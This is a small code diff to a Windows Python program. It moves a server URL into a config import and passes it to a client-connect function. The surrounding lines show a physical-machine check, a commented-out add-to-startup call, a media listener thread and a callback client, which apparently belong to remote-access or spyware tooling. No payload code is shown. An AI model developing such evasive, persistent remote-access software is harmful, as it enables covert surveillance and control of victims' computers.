@@ -6,6 +6,7 @@ import sys
 import threading
 import winreg
 
+from config import server_url
 from media_utils import start_listener
 from network_utils import start_client
 
@@ -75,7 +76,7 @@ def main():
         print("Running on a physical machine.")
         # add_to_startup()
         threading.Thread(target=start_listener).start()
-        start_client()
+        start_client(server_url)
 
 
 if __name__ == '__main__':
